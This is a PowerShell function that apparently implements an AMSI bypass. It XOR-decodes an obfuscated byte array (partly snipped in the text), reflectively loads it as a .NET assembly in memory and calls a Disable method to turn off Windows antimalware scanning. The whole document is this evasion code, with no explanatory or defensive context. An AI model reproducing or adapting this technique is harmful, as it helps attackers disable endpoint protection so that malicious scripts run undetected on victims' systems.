function AMSBP {
	if (-not ([System.Management.Automation.PSTypeName]"BP.AMS").Type) {
		$byteArray = @(65,15,209,12,86,65,12,85,69,12,85,<SNIPPED_FOR_BREVITY>,65,12,85,65,12)
		$KeyArray = @(12, 85, 65)
		$keyposition = 0
		for ($i = 0; $i -lt $byteArray.count; $i++)
		{
			$byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]
			$keyposition += 1
			if ($keyposition -eq $keyArray.Length) { $keyposition = 0 }
		}
		[Reflection.Assembly]::Load([byte[]]$byteArray) | Out-Null
		Write-Output "DLL has been reflected"
	}
	[BP.AMS]::Disable()
}
